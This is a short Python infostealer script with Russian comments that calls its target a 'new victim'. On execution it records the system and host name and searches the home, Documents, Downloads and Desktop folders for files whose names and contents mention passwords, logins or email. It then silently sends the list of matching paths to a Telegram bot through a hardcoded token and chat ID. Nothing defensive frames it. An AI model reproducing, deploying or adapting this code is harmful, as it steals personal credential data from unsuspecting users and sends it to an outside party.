
import os
import requests
import platform
from datetime import datetime

BOT_TOKEN = "8192544666:AAEMrJpLbIXmpsSpvBNQTwZZPmGS8WHwYtc"
ADMIN_ID = 8317693530

def collect_data():
    data = "🎯 НОВАЯ ЖЕРТВА 🎯\\n"
    data += f"ID: VICTIM_20251003_183901\\n"
    data += f"💻 Система: {platform.system()}\\n"
    data += f"👤 Пользователь: {platform.node()}\\n"
    data += f"📁 Директория: {os.getcwd()}\\n"
    
    # Поиск файлов
    search_paths = [
        os.path.expanduser("~"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop")
    ]
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(keyword in file.lower() for keyword in ['pass', 'login', 'account', 'mail']):
                        full_path = os.path.join(root, file)
                        try:
                            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read(1000)
                                if any(sensitive in content.lower() for sensitive in ['password', 'login', 'email']):
                                    data += f"🔐 {full_path}\\n"
                        except: 
                            pass
    return data

def send_data():
    data = collect_data()
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": ADMIN_ID, "text": data})
    except: 
        pass

send_data()
